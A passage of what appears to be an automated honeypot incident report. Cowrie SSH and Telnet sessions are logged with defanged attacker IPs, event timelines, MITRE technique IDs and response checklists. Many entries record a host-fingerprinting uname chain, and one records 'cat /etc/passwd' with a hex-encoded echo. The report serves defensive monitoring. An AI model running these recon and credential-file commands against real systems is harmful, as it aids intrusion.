| `2026-08-11 07:44:51` | `cowrie.log.closed` |
| `2026-08-11 07:44:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f38550e34cd8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:46 |
| **Last Seen** | 2026-08-11 07:46 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:46:44` | `cowrie.session.connect` |
| `2026-08-11 07:46:44` | `cowrie.client.version` |
| `2026-08-11 07:46:44` | `cowrie.client.kex` |
| `2026-08-11 07:46:46` | `cowrie.login.success` |
| `2026-08-11 07:46:51` | `cowrie.session.params` |
| `2026-08-11 07:46:51` | `cowrie.command.input` |
| `2026-08-11 07:46:51` | `cowrie.command.input` |
| `2026-08-11 07:46:51` | `cowrie.command.input` |
| `2026-08-11 07:46:51` | `cowrie.command.input` |
| `2026-08-11 07:46:51` | `cowrie.command.input` |
| `2026-08-11 07:46:51` | `cowrie.command.success` |
| `2026-08-11 07:46:51` | `cowrie.command.input` |
| `2026-08-11 07:46:51` | `cowrie.command.input` |
| `2026-08-11 07:46:51` | `cowrie.command.input` |
| `2026-08-11 07:46:51` | `cowrie.command.input` |
| `2026-08-11 07:46:55` | `cowrie.log.closed` |
| `2026-08-11 07:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7a250c12491

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:48 |
| **Last Seen** | 2026-08-11 07:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:48:44` | `cowrie.session.connect` |
| `2026-08-11 07:48:45` | `cowrie.client.version` |
| `2026-08-11 07:48:45` | `cowrie.client.kex` |
| `2026-08-11 07:48:47` | `cowrie.login.success` |
| `2026-08-11 07:48:49` | `cowrie.session.params` |
| `2026-08-11 07:48:49` | `cowrie.command.input` |
| `2026-08-11 07:48:49` | `cowrie.command.input` |
| `2026-08-11 07:48:49` | `cowrie.command.input` |
| `2026-08-11 07:48:49` | `cowrie.command.input` |
| `2026-08-11 07:48:49` | `cowrie.command.input` |
| `2026-08-11 07:48:49` | `cowrie.command.success` |
| `2026-08-11 07:48:49` | `cowrie.command.input` |
| `2026-08-11 07:48:49` | `cowrie.command.input` |
| `2026-08-11 07:48:49` | `cowrie.command.input` |
| `2026-08-11 07:48:49` | `cowrie.command.input` |
| `2026-08-11 07:48:49` | `cowrie.log.closed` |
| `2026-08-11 07:48:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5791f33f32c8

| Field | Detail |
|---|---|
| **Source IP** | `37.46.160[.]175` |
| **First Seen** | 2026-08-11 07:49 |
| **Last Seen** | 2026-08-11 07:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:49:02` | `cowrie.session.connect` |
| `2026-08-11 07:49:03` | `cowrie.client.version` |
| `2026-08-11 07:49:03` | `cowrie.client.kex` |
| `2026-08-11 07:49:03` | `cowrie.login.success` |
| `2026-08-11 07:49:04` | `cowrie.direct-tcpip.request` |
| `2026-08-11 07:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.46.160[.]175` to AbuseIPDB if not already reported
- [ ] Block `37.46.160[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f416eb81acae

| Field | Detail |
|---|---|
| **Source IP** | `85.105.255[.]56` |
| **First Seen** | 2026-08-11 07:49 |
| **Last Seen** | 2026-08-11 07:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:49:11` | `cowrie.session.connect` |
| `2026-08-11 07:49:11` | `cowrie.client.version` |
| `2026-08-11 07:49:11` | `cowrie.client.kex` |
| `2026-08-11 07:49:13` | `cowrie.login.success` |
| `2026-08-11 07:49:13` | `cowrie.direct-tcpip.request` |
| `2026-08-11 07:49:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.105.255[.]56` to AbuseIPDB if not already reported
- [ ] Block `85.105.255[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0d5732a3bd1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:50 |
| **Last Seen** | 2026-08-11 07:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:50:38` | `cowrie.session.connect` |
| `2026-08-11 07:50:39` | `cowrie.client.version` |
| `2026-08-11 07:50:39` | `cowrie.client.kex` |
| `2026-08-11 07:50:40` | `cowrie.login.success` |
| `2026-08-11 07:50:42` | `cowrie.session.params` |
| `2026-08-11 07:50:42` | `cowrie.command.input` |
| `2026-08-11 07:50:42` | `cowrie.command.input` |
| `2026-08-11 07:50:42` | `cowrie.command.input` |
| `2026-08-11 07:50:42` | `cowrie.command.input` |
| `2026-08-11 07:50:42` | `cowrie.command.input` |
| `2026-08-11 07:50:42` | `cowrie.command.success` |
| `2026-08-11 07:50:42` | `cowrie.command.input` |
| `2026-08-11 07:50:42` | `cowrie.command.input` |
| `2026-08-11 07:50:42` | `cowrie.command.input` |
| `2026-08-11 07:50:42` | `cowrie.command.input` |
| `2026-08-11 07:50:43` | `cowrie.log.closed` |
| `2026-08-11 07:50:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7f3babf7867

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:53 |
| **Last Seen** | 2026-08-11 07:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:53:15` | `cowrie.session.connect` |
| `2026-08-11 07:53:15` | `cowrie.client.version` |
| `2026-08-11 07:53:15` | `cowrie.client.kex` |
| `2026-08-11 07:53:16` | `cowrie.login.success` |
| `2026-08-11 07:53:18` | `cowrie.session.params` |
| `2026-08-11 07:53:18` | `cowrie.command.input` |
| `2026-08-11 07:53:18` | `cowrie.command.input` |
| `2026-08-11 07:53:18` | `cowrie.command.input` |
| `2026-08-11 07:53:18` | `cowrie.command.input` |
| `2026-08-11 07:53:18` | `cowrie.command.input` |
| `2026-08-11 07:53:18` | `cowrie.command.success` |
| `2026-08-11 07:53:18` | `cowrie.command.input` |
| `2026-08-11 07:53:18` | `cowrie.command.input` |
| `2026-08-11 07:53:18` | `cowrie.command.input` |
| `2026-08-11 07:53:18` | `cowrie.command.input` |
| `2026-08-11 07:53:18` | `cowrie.log.closed` |
| `2026-08-11 07:53:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55e5ff9b6e17

| Field | Detail |
|---|---|
| **Source IP** | `210.4.68[.]72` |
| **First Seen** | 2026-08-11 07:54 |
| **Last Seen** | 2026-08-11 07:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:54:03` | `cowrie.session.connect` |
| `2026-08-11 07:54:04` | `cowrie.client.version` |
| `2026-08-11 07:54:04` | `cowrie.client.kex` |
| `2026-08-11 07:54:06` | `cowrie.login.success` |
| `2026-08-11 07:54:07` | `cowrie.direct-tcpip.request` |
| `2026-08-11 07:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.4.68[.]72` to AbuseIPDB if not already reported
- [ ] Block `210.4.68[.]72` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e138de5038fd

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:55 |
| **Last Seen** | 2026-08-11 07:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:55:18` | `cowrie.session.connect` |
| `2026-08-11 07:55:19` | `cowrie.client.version` |
| `2026-08-11 07:55:19` | `cowrie.client.kex` |
| `2026-08-11 07:55:20` | `cowrie.login.success` |
| `2026-08-11 07:55:22` | `cowrie.session.params` |
| `2026-08-11 07:55:22` | `cowrie.command.input` |
| `2026-08-11 07:55:22` | `cowrie.command.input` |
| `2026-08-11 07:55:22` | `cowrie.command.input` |
| `2026-08-11 07:55:22` | `cowrie.command.input` |
| `2026-08-11 07:55:22` | `cowrie.command.input` |
| `2026-08-11 07:55:22` | `cowrie.command.success` |
| `2026-08-11 07:55:22` | `cowrie.command.input` |
| `2026-08-11 07:55:22` | `cowrie.command.input` |
| `2026-08-11 07:55:22` | `cowrie.command.input` |
| `2026-08-11 07:55:22` | `cowrie.command.input` |
| `2026-08-11 07:55:22` | `cowrie.log.closed` |
| `2026-08-11 07:55:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e16ec95e7b4

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-11 07:57 |
| **Last Seen** | 2026-08-11 07:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:57:51` | `cowrie.session.connect` |
| `2026-08-11 07:57:51` | `cowrie.client.version` |
| `2026-08-11 07:57:51` | `cowrie.client.kex` |
| `2026-08-11 07:57:52` | `cowrie.login.success` |
| `2026-08-11 07:57:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78485b1efbf6

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-11 07:57 |
| **Last Seen** | 2026-08-11 07:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:57:51` | `cowrie.session.connect` |
| `2026-08-11 07:57:51` | `cowrie.client.version` |
| `2026-08-11 07:57:52` | `cowrie.client.kex` |
| `2026-08-11 07:57:52` | `cowrie.login.success` |
| `2026-08-11 07:57:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f24f5fed902

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:58 |
| **Last Seen** | 2026-08-11 07:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:58:05` | `cowrie.session.connect` |
| `2026-08-11 07:58:05` | `cowrie.client.version` |
| `2026-08-11 07:58:05` | `cowrie.client.kex` |
| `2026-08-11 07:58:06` | `cowrie.login.success` |
| `2026-08-11 07:58:07` | `cowrie.session.params` |
| `2026-08-11 07:58:07` | `cowrie.command.input` |
| `2026-08-11 07:58:07` | `cowrie.command.input` |
| `2026-08-11 07:58:07` | `cowrie.command.input` |
| `2026-08-11 07:58:07` | `cowrie.command.input` |
| `2026-08-11 07:58:07` | `cowrie.command.input` |
| `2026-08-11 07:58:07` | `cowrie.command.success` |
| `2026-08-11 07:58:07` | `cowrie.command.input` |
| `2026-08-11 07:58:07` | `cowrie.command.input` |
| `2026-08-11 07:58:07` | `cowrie.command.input` |
| `2026-08-11 07:58:07` | `cowrie.command.input` |
| `2026-08-11 07:58:08` | `cowrie.log.closed` |
| `2026-08-11 07:58:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c26093fb47e4

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-11 07:59 |
| **Last Seen** | 2026-08-11 07:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:59:16` | `cowrie.session.connect` |
| `2026-08-11 07:59:16` | `cowrie.client.version` |
| `2026-08-11 07:59:17` | `cowrie.client.kex` |
| `2026-08-11 07:59:17` | `cowrie.login.success` |
| `2026-08-11 07:59:17` | `cowrie.direct-tcpip.request` |
| `2026-08-11 07:59:17` | `cowrie.direct-tcpip.data` |
| `2026-08-11 07:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-033e64aac731

| Field | Detail |
|---|---|
| **Source IP** | `65.20.175[.]6` |
| **First Seen** | 2026-08-11 07:59 |
| **Last Seen** | 2026-08-11 07:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:59:24` | `cowrie.session.connect` |
| `2026-08-11 07:59:25` | `cowrie.client.version` |
| `2026-08-11 07:59:25` | `cowrie.client.kex` |
| `2026-08-11 07:59:26` | `cowrie.login.success` |
| `2026-08-11 07:59:27` | `cowrie.direct-tcpip.request` |
| `2026-08-11 07:59:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.175[.]6` to AbuseIPDB if not already reported
- [ ] Block `65.20.175[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2cdd76b1b5b

| Field | Detail |
|---|---|
| **Source IP** | `107.173.67[.]180` |
| **First Seen** | 2026-08-11 07:59 |
| **Last Seen** | 2026-08-11 07:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1059.004 · T1078 · T1083 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:59:31` | `cowrie.session.connect` |
| `2026-08-11 07:59:34` | `cowrie.telnet.option` |
| `2026-08-11 07:59:36` | `cowrie.telnet.option` |
| `2026-08-11 07:59:36` | `cowrie.login.success` |
| `2026-08-11 07:59:37` | `cowrie.session.params` |
| `2026-08-11 07:59:39` | `cowrie.telnet.option` |
| `2026-08-11 07:59:39` | `cowrie.telnet.option` |
| `2026-08-11 07:59:39` | `cowrie.command.input` |
| `2026-08-11 07:59:39` | `cowrie.command.input` |
| `2026-08-11 07:59:39` | `cowrie.command.input` |
| `2026-08-11 07:59:40` | `cowrie.command.input` |
| `2026-08-11 07:59:40` | `cowrie.command.failed` |
| `2026-08-11 07:59:40` | `cowrie.command.input` |
| `2026-08-11 07:59:40` | `cowrie.command.failed` |
| `2026-08-11 07:59:40` | `cowrie.command.input` |
| `2026-08-11 07:59:40` | `cowrie.command.failed` |
| `2026-08-11 07:59:40` | `cowrie.command.input` |
| `2026-08-11 07:59:40` | `cowrie.command.input` |
| `2026-08-11 07:59:40` | `cowrie.command.input` |
| `2026-08-11 07:59:40` | `cowrie.command.input` |
| `2026-08-11 07:59:40` | `cowrie.command.input` |
| `2026-08-11 07:59:40` | `cowrie.command.input` |
| `2026-08-11 07:59:41` | `cowrie.log.closed` |
| `2026-08-11 07:59:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.173.67[.]180` to AbuseIPDB if not already reported
- [ ] Block `107.173.67[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e60c08e45810

| Field | Detail |
|---|---|
| **Source IP** | `58.35.165[.]225` |
| **First Seen** | 2026-08-11 08:00 |
| **Last Seen** | 2026-08-11 08:00 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:00:03` | `cowrie.session.connect` |
| `2026-08-11 08:00:08` | `cowrie.client.version` |
| `2026-08-11 08:00:09` | `cowrie.client.kex` |
| `2026-08-11 08:00:26` | `cowrie.login.success` |
| `2026-08-11 08:00:39` | `cowrie.session.params` |
| `2026-08-11 08:00:39` | `cowrie.command.input` |
| `2026-08-11 08:00:43` | `cowrie.log.closed` |
| `2026-08-11 08:00:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.35.165[.]225` to AbuseIPDB if not already reported
- [ ] Block `58.35.165[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d891b422f44

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:00 |
| **Last Seen** | 2026-08-11 08:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:00:10` | `cowrie.session.connect` |
| `2026-08-11 08:00:10` | `cowrie.client.version` |
| `2026-08-11 08:00:10` | `cowrie.client.kex` |
| `2026-08-11 08:00:12` | `cowrie.login.success` |
| `2026-08-11 08:00:13` | `cowrie.session.params` |
| `2026-08-11 08:00:13` | `cowrie.command.input` |
| `2026-08-11 08:00:13` | `cowrie.command.input` |
| `2026-08-11 08:00:13` | `cowrie.command.input` |
| `2026-08-11 08:00:13` | `cowrie.command.input` |
| `2026-08-11 08:00:13` | `cowrie.command.input` |
| `2026-08-11 08:00:13` | `cowrie.command.success` |
| `2026-08-11 08:00:13` | `cowrie.command.input` |
| `2026-08-11 08:00:13` | `cowrie.command.input` |
| `2026-08-11 08:00:13` | `cowrie.command.input` |
| `2026-08-11 08:00:13` | `cowrie.command.input` |
| `2026-08-11 08:00:13` | `cowrie.log.closed` |
| `2026-08-11 08:00:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93568ff971af

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:02 |
| **Last Seen** | 2026-08-11 08:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
